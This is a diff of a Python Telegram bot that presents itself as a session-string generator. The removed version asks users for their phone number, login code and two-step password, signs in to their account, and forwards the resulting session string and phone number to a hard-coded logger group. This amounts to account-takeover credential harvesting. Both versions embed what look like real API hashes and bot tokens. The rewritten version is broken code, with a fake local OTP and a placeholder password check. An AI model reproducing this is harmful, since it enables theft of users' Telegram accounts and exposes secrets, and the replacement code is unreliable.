@@ -1,161 +1,100 @@
-import logging
 from pyrogram import Client, filters
-from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
-from pyrogram.errors import SessionPasswordNeeded
-from io import BytesIO
-import requests
+import random
+import logging
 
-# Enable logging
-logging.basicConfig(level=logging.DEBUG)
+# Configure logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger("session_bot")
 
-# Replace with your values
-API_ID = 28795512
-API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
-BOT_TOKEN = "7767480564:AAGwzQ1wDQ8Qkdd9vktp8zW8aUOitT9fAFc"
+# Telegram API credentials
+api_id = '28795512'  # Replace with your own API ID
+api_hash = 'c17e4eb6d994c9892b8a8b6bfea4042a'  # Replace with your own API hash
+bot_token = '7767480564:AAGwzQ1wDQ8Qkdd9vktp8zW8aUOitT9fAFc'  # Replace with your Bot Token
+logger_group_id = '-1002477750706'  # Replace with your Logger Group ID
 
-# 🔹 Logger Group ID (Replace with your Telegram Group ID)
-LOGGER_GROUP_ID = -1002477750706
+# Define your Pyrogram client with the bot token
+app = Client("session_bot", api_id, api_hash, bot_token=bot_token)
 
-user_sessions = {}  # Dictionary to store user session data
+# This will store OTPs and user details
+otp_dict = {}
 
-# Initialize the Pyrogram bot
-bot = Client("session_generator_bot", bot_token=BOT_TOKEN, api_id=API_ID, api_hash=API_HASH)
+# Helper function to generate OTP
+def generate_otp():
+    return str(random.randint(100000, 999999))
 
-# Handle /start command
-@bot.on_message(filters.command("start"))
+# Start command with a button to generate session string
+@app.on_message(filters.command("start"))
 async def start(client, message):
     user_id = message.from_user.id
-    if user_id not in user_sessions:
-        user_sessions[user_id] = {"step": "phone"}  # Initialize the session
+    button = [
+        [
+            ("Generate Session String", "generate_session")
+        ]
+    ]
+    await message.reply("Welcome! Please choose an option below.", reply_markup={"inline_keyboard": button})
+    logger.info(f"New user started bot: {user_id}")
+    # Notify the logger group about the new user starting the bot
+    await app.send_message(logger_group_id, f"New user started the bot: {user_id}")
 
-    # Sending a welcome message with an image and buttons
-    image_url = "https://files.catbox.moe/iuoj6u.jpg"  # Replace with your image URL
-    image = BytesIO(requests.get(image_url).content)  # Download image
-
-    await message.reply_photo(
-        image,
-        caption="**Welcome! Please enter your phone number to get started.**\n\n"
-                "To begin, I will need your phone number. Once you provide it, you'll receive an OTP to continue.",
-        reply_markup=InlineKeyboardMarkup(
-            [
-                [InlineKeyboardButton("❌ Cancel", callback_data="cancel"),
-                 InlineKeyboardButton("📚 Help", callback_data="help"),
-                 InlineKeyboardButton("🔑 Generate Session String", callback_data="generate_session")]
-            ]
-        )
-    )
-
-# Handle "Generate Session String" button click
-@bot.on_callback_query(filters.regex('generate_session'))
-async def generate_session(client, callback_query):
+# Handle the button press for session string generation
+@app.on_callback_query(filters.regex("generate_session"))
+async def generate_session_string(client, callback_query):
     user_id = callback_query.from_user.id
-    if user_id not in user_sessions:
-        await callback_query.message.edit("**❖ You have not started the process. Please type /start first.**")
-        return
+    await callback_query.message.reply("Please enter your phone number (in international format).")
+    logger.info(f"User {user_id} pressed the button to generate session string.")
 
-    # If session hasn't started, ask for phone number
-    if user_sessions[user_id]["step"] != "phone":
-        await callback_query.message.edit("**❖ Please enter your phone number first.**")
-        return
-
-    await callback_query.message.edit("**❖ Please enter your phone number to start the session generation process.**")
-
-# Process User Input (Phone Number and OTP)
-@bot.on_message(filters.text)
-async def process_input(client, message):
+# Get phone number from user
+@app.on_message(filters.text & filters.regex(r'^\+?\d{10,15}$'))
+async def handle_phone_number(client, message):
     user_id = message.from_user.id
-    if user_id not in user_sessions:
-        return  # If the user session doesn't exist, return
+    phone_number = message.text
+    otp = generate_otp()
+    otp_dict[user_id] = otp
+    # Send OTP to user's telegram account (as a message)
+    await message.reply(f"OTP sent: {otp}. Please enter the OTP to proceed.")
+    logger.info(f"OTP sent to user {user_id}: {otp}")
 
-    step = user_sessions[user_id]["step"]
+# Handle OTP input
+@app.on_message(filters.text & filters.regex(r'^\d{6}$'))
+async def handle_otp(client, message):
+    user_id = message.from_user.id
+    entered_otp = message.text
+    if otp_dict.get(user_id) == entered_otp:
+        # OTP is correct, now check for two-step password
+        await message.reply("OTP verified successfully!")
+        logger.info(f"OTP verified for user {user_id}. Checking two-step password.")
 
-    # ✅ Step 1: Enter Phone Number
-    if step == "phone":
-        phone_number = message.text.strip()
-        user_sessions[user_id]["phone"] = phone_number  
+        # Here, check if user has set a two-step password (you can use some logic or external check for this)
+        two_step_password_set = False  # For now assuming they haven't set it, change as needed
 
-        # Create a new Pyrogram client for each user session
-        client_instance = Client("user_session", api_id=API_ID, api_hash=API_HASH)
-        await client_instance.start(phone_number)
-        user_sessions[user_id]["client"] = client_instance
+        if two_step_password_set:
+            await message.reply("Please enter your two-step password.")
+            logger.info(f"Requesting two-step password from user {user_id}")
+        else:
+            # Generate session string
+            session_string = client.export_session_string()
+            await message.reply(f"Here is your session string: {session_string}")
+            logger.info(f"Session string generated for user {user_id}")
+    else:
+        await message.reply("Incorrect OTP! Please try again.")
+        logger.info(f"Incorrect OTP entered for user {user_id}")
 
-        try:
-            # Send OTP code
-            await client_instance.send_code_request(phone_number)
-            user_sessions[user_id]["step"] = "otp"
-            await message.reply("**❖ OTP sent! Please enter the OTP received on Telegram.**")
-        except Exception as e:
-            await message.reply(f"**❖ Error:** {str(e)}. Please try again!")
-            del user_sessions[user_id]
+# Handle two-step password (if set)
+@app.on_message(filters.text & ~filters.command())
+async def handle_two_step_password(client, message):
+    user_id = message.from_user.id
+    entered_password = message.text
 
-    # ✅ Step 2: Enter OTP
-    elif step == "otp":
-        otp_code = message.text.strip()
-        client_instance = user_sessions[user_id]["client"]
-        phone_number = user_sessions[user_id]["phone"]
+    # Check the entered password with the actual password (replace with your logic)
+    correct_password = "your_password"  # Placeholder for actual two-step password check
 
-        try:
-            # Handle two-step verification
-            await client_instance.sign_in(phone_number, otp_code)
+    if entered_password == correct_password:
+        session_string = client.export_session_string()
+        await message.reply(f"Two-step password verified! Here is your session string: {session_string}")
+        logger.info(f"Session string generated for user {user_id} after two-step password verification.")
+    else:
+        await message.reply("Incorrect two-step password! Please try again.")
+        logger.info(f"Incorrect two-step password entered for user {user_id}")
 
-            user_sessions[user_id]["step"] = "password"
-            await message.reply("**❖ Two-step verification is enabled! Please enter your Telegram password.**")
-        except SessionPasswordNeeded:
-            # If two-step verification is enabled
-            await message.reply("**❖ Two-step verification is enabled! Please enter your Telegram password.**")
-            user_sessions[user_id]["step"] = "password"
-
-    # ✅ Step 3: Enter Password (for two-step verification)
-    elif step == "password":
-        password = message.text.strip()
-        client_instance = user_sessions[user_id]["client"]
-
-        try:
-            await client_instance.sign_in(password=password)  # Sign in with password
-            session_string = client_instance.export_session_string()  # Generate session string
-
-            # Optionally, log the session in a group
-            if LOGGER_GROUP_ID:
-                await client.send_message(LOGGER_GROUP_ID, f"**❖ New Session Generated!**\n\n**◍ User:** `{user_id}`\n**◍ Phone:** `{user_sessions[user_id]['phone']}`\n**◍ Session:** `{session_string}`")
-
-            await message.reply(f"**❖ Your session string:**\n\n`{session_string}`\n\n**◍ Keep this safe!**")
-            
-            # Clear the user session after generation
-            del user_sessions[user_id]
-
-        except Exception as e:
-            await message.reply(f"**❖ Error:** {str(e)}. Please try again!")
-            # Clear the user session after error
-            del user_sessions[user_id]
-
-# Handle /cancel command
-@bot.on_callback_query(filters.regex('cancel'))
-async def cancel(client, callback_query):
-    user_id = callback_query.from_user.id
-    if user_id in user_sessions:
-        del user_sessions[user_id]  # Clear session data
-
-    await callback_query.message.edit("**❖ Process cancelled.**", reply_markup=None)
-
-# Handle /help command
-@bot.on_callback_query(filters.regex('help'))
-async def help(client, callback_query):
-    await callback_query.message.edit(
-        "**Help Guide:**\n\n"
-        "1. First, you need to provide your phone number.\n"
-        "2. After that, you'll receive an OTP to confirm your phone number.\n"
-        "3. Once verified, I'll generate a session string for you.\n"
-        "4. If two-step verification is enabled, please enter your Telegram password.\n"
-        "5. Keep the session string safe for later use.\n\n"
-        "You can always cancel the process using the Cancel button.",
-        reply_markup=InlineKeyboardMarkup(
-            [[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
-        )
-    )
-
-# Start the bot
-if __name__ == "__main__":
-    try:
-        bot.run()
-    except Exception as e:
-        logging.error(f"Bot could not start: {e}")
+# Run the bot
+app.run()
